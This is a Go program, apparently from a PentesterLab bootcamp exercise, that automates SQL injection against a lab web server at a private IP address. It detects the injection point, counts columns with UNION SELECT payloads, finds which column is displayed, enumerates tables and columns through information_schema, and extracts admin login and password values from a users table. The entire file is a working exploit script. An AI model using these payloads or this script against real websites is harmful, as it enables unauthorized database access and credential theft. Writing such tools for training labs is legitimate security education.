package main

import (
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"regexp"
	"strings"
	"time"
	"github.com/grokify/html-strip-tags-go"
)

func main() {
	goopher()
	time.Sleep(2 * time.Second)
	CheckSQLi()
	CheckColumn()
	CheckDisplay()
	ChecKnames()
	SearchAdmincreds()
}

func goopher() {
	fmt.Println("\n\n##################################################")
	fmt.Println("#     PENTESTERLAB BOOTCAMP: AUTOMATING SQLi     #")
	fmt.Println("#                BY RICARDO LOPES                #")
	fmt.Println("##################################################")
	fmt.Println("MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM")
	fmt.Println("MMMMMMMMMMNyo:-.``.-/smMMMMMMMMMMMMMMMMMMMMMMMMMMM")
	fmt.Println("MMMMMMMMm/`-+shddddyo:`-sNMMMMMMMMMMMMMMMMMMMMMMMM")
	fmt.Println("MmdNMMNo :hddddddddddddo-`+++yNMMMMMMMMMMMMMMMMMMM")
	fmt.Println("o -.`.``-++dddddds+/://++o-:-``mMMMMMMMMMMMMMMMMMM")
	fmt.Println("``+osso:++sdddddds:../::/yy/:` dMMMMMMMMMMMMMMMMMM")
	fmt.Println("N: /+oyhdoosssssssssssossso-  :mMMMMMMMMh::sMMMMMM")
	fmt.Println("Ms ..` ydo:::::::...:o::::..-o. hMMMMMMM- + /NMMMM")
	fmt.Println("MMMNN- ddd/:::::-...hmy-:-..:d+ oMMMMMNy` ds.```.+")
	fmt.Println("MMMMy :ddddso/:::.....-:os:..  sMMMMN- -ohs.ys/.`+")
	fmt.Println("MMMh -dddddddddhyysooossyhy: .///oss+    `.yy -dMM")
	fmt.Println("MMN.`dddddddddddddddddddddd+.--:: ``.....`  / +MMM")
	fmt.Println("N:` +yhddddddddddddddhyyyydddds-. - ```-+yms/+mMMM")
	fmt.Println("d `/hysssyhdddhosddddddyydds:`.+sdMMNMMMMMMMMMMMMM")
	fmt.Println("Mm- sddhhssssssooyyhhyyhyy. smMMMMMMMMMMMMMMMMMMMM")
	fmt.Println("MMm -dddyshyshhhhyyyyyyyho `.dMMMMMMMMMMMMMMMMMMMM")
	fmt.Println("MMMy`-yyydhshdddddddddddh+/- oMMMMMMMMMMMMMMMMMMMM")
	fmt.Println("MMMMN/ :yddddddddddddhyo::. /NMMMMMMMMMMMMMMMMMMMM")
	fmt.Println("MMMMMM: //::-.`..``..-:++/+dMMMMMMMMMMMMMMMMMMMMMM")
	fmt.Println("MMMMMMd-` :hmNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM")
	fmt.Println("MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM")
	fmt.Println("MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM")
	fmt.Println("MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM")
}

// CheckSQLi creates a GET request and checks if there is a databasse error in response body
func CheckSQLi() {
	url := "http://192.168.17.146/cat.php?id=1"
	resp, err := http.Get(url + "'")
	if err != nil {
		log.Fatalln(err)
	}

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Fatalln(err)
	}

	fmt.Println("\n\n[+] Checking website for SQL injection...")
	time.Sleep(2 * time.Second)

	hasSQL := "You have an error in your SQL syntax"
	s := string(body)
	matched := strings.Contains(s, hasSQL)
	if matched {
		fmt.Println("[+] Possible SQL Injection found !")
		time.Sleep(1 * time.Second)
	} else {
		fmt.Println("[-] No SQL Injection found.")
	}
}

// CheckColumn checks the number of columns in the database
func CheckColumn() {
	fmt.Println("\n[+] Checking number of columns...")
	time.Sleep(2 * time.Second)
	ColumnUnknown := true
	url := "http://192.168.17.146/cat.php?id=1%20UNION%20SELECT%20null"
	ColumnErr := "different number of columns"

	// column 1
	for ColumnUnknown {
		resp, err := http.Get(url)
		if err != nil {
			log.Fatalln(err)
		}

		body, err := ioutil.ReadAll(resp.Body)
		if err != nil {
			log.Fatalln(err)
		}

		s := string(body)
		matched := strings.Contains(s, ColumnErr)
		if matched {
			fmt.Println("    [-] Database has more than 1 column.")
			time.Sleep(1 * time.Second)
			break
		} else {
			fmt.Println("    [+] Database has 1 column !")
			ColumnUnknown = false
			time.Sleep(1 * time.Second)
		}
	}

	// column 2
	for ColumnUnknown {
		url := url + ",null"
		resp, err := http.Get(url)
		if err != nil {
			log.Fatalln(err)
		}

		body, err := ioutil.ReadAll(resp.Body)
		if err != nil {
			log.Fatalln(err)
		}

		s := string(body)
		matched := strings.Contains(s, ColumnErr)
		if matched {
			fmt.Println("    [-] Database has more than 2 column.")
			time.Sleep(1 * time.Second)
			break
		} else {
			fmt.Println("    [+] Database has 2 columns !")
			ColumnUnknown = false
			time.Sleep(1 * time.Second)
		}
	}

	// column 3
	for ColumnUnknown {
		url := url + ",null,null"
		resp, err := http.Get(url)
		if err != nil {
			log.Fatalln(err)
		}

		body, err := ioutil.ReadAll(resp.Body)
		if err != nil {
			log.Fatalln(err)
		}

		s := string(body)
		matched := strings.Contains(s, ColumnErr)
		if matched {
			fmt.Println("    [-] Database has more than 3 column.")
			time.Sleep(1 * time.Second)
			break
		} else {
			fmt.Println("    [+] Database has 3 columns !")
			ColumnUnknown = false
			time.Sleep(1 * time.Second)
		}
	}

	// column 3
	for ColumnUnknown {
		url := url + ",null,null,null"
		resp, err := http.Get(url)
		if err != nil {
			log.Fatalln(err)
		}

		body, err := ioutil.ReadAll(resp.Body)
		if err != nil {
			log.Fatalln(err)
		}

		s := string(body)
		matched := strings.Contains(s, ColumnErr)
		if matched {
			fmt.Println("    [-] Database has more than 4 column.")
			time.Sleep(1 * time.Second)
			break
		} else {
			fmt.Println("    [+] Database has 4 columns !")
			ColumnUnknown = false
			time.Sleep(1 * time.Second)
		}
	}

}

// CheckDisplay checks which columns display data
func CheckDisplay() {
	fmt.Println("\n[+] Checking displaying columns [+]")
	time.Sleep(1 * time.Second)
	UnknownOutput := true
	url := "http://192.168.17.146/cat.php?id=1%20UNION%20SELECT%20"
	output := "pentesterlab@localhost"

	// column 1
	for UnknownOutput {
		url := url + "current_user(),null,null,null"
		resp, err := http.Get(url)
		if err != nil {
			log.Fatalln(err)
		}

		body, err := ioutil.ReadAll(resp.Body)
		if err != nil {
			log.Fatalln(err)
		}

		s := string(body)
		matched := strings.Contains(s, output)
		if matched {
			fmt.Println("    [+] Data displayed on 1st column!")
			UnknownOutput = false
			time.Sleep(1 * time.Second)
		} else {
			fmt.Println("    [-] No data displayed on 1st column.")
			time.Sleep(1 * time.Second)
			break
		}
	}

	for UnknownOutput {
		url := url + "null,current_user(),null,null"
		resp, err := http.Get(url)
		if err != nil {
			log.Fatalln(err)
		}

		body, err := ioutil.ReadAll(resp.Body)
		if err != nil {
			log.Fatalln(err)
		}

		s := string(body)
		matched := strings.Contains(s, output)
		if matched {
			fmt.Println("    [+] Data displayed on 2nd column!")
			time.Sleep(1 * time.Second)
			break
		} else {
			fmt.Println("    [-] No data displayed on 2nd column.")
			time.Sleep(1 * time.Second)
			break
		}
	}

	for UnknownOutput {
		url := url + "null,null,current_user(),null"
		resp, err := http.Get(url)
		if err != nil {
			log.Fatalln(err)
		}

		body, err := ioutil.ReadAll(resp.Body)
		if err != nil {
			log.Fatalln(err)
		}

		s := string(body)
		matched := strings.Contains(s, output)
		if matched {
			fmt.Println("    [+] Data displayed on 3rd column!")
			time.Sleep(1 * time.Second)
			break
		} else {
			fmt.Println("    [-] No data displayed on 3rd column.")
			time.Sleep(1 * time.Second)
			break
		}
	}

	for UnknownOutput {
		url := url + "null,null,null,current_user()"
		resp, err := http.Get(url)
		if err != nil {
			log.Fatalln(err)
		}

		body, err := ioutil.ReadAll(resp.Body)
		if err != nil {
			log.Fatalln(err)
		}

		s := string(body)
		matched := strings.Contains(s, output)
		if matched {
			fmt.Println("    [+] Data displayed on 4th column!")
			UnknownOutput = false
			time.Sleep(1 * time.Second)
		} else {
			fmt.Println("    [-] No data displayed on 4th column.")
			time.Sleep(1 * time.Second)
			break
		}
	}
}

// ChecKnames checks for column and table names for users
func ChecKnames() {
	fmt.Println("\n[+] Checking column and table names for users...")
	time.Sleep(1 * time.Second)

	names := "users:.+"
	url := "http://192.168.17.146/cat.php?id=1%20UNION%20SELECT%20"

	resp, err := http.Get(url + "null,concat(table_name,%27:%27,column_name),null,null%20FROM%20information_schema.columns")
	if err != nil {
		log.Fatalln(err)
	}

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Fatalln(err)
	}

	re := regexp.MustCompile(names)
	matches := re.FindAllString(string(body), -1)
	matched := strings.Join(matches, " ")
	stripped := strip.StripTags(matched) // strip html tags
	reg, err := regexp.Compile("[^a-zA-z0-9:]+")
	if err != nil {
		log.Fatal(err)
	}
	processedString := reg.ReplaceAllString(stripped, " ")
	for _, name := range strings.Split(processedString, " ") {
		fmt.Println("  " + name)
	}

}

// SearchAdmincreds searches for admin credentials
func SearchAdmincreds() {
	fmt.Println("\n[+] Searching for admin credentials...")
	time.Sleep(1 * time.Second)
	creds := "admin:.+"
	url := "http://192.168.17.146/cat.php?id=1%20UNION%20SELECT%20null,concat(login,%27:%27,password),null,null%20FROM%20users"

	resp, err := http.Get(url)
	if err != nil {
		log.Fatalln(err)
	}

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Fatalln(err)
	}

	re := regexp.MustCompile(creds)
	matches := re.FindStringSubmatch(string(body))
	matched := strings.Join(matches, " ")
	matchedStrip := strip.StripTags(matched)
	AdminCreds := strings.Contains(string(body), matchedStrip)
	if AdminCreds {
		fmt.Println("    [+] Admin credentials found!")
		time.Sleep(2 * time.Second)
		fmt.Printf("    [+] %v\n\n", matchedStrip)
	} else {
		fmt.Println("    [-] No credentials found...")
	}

}
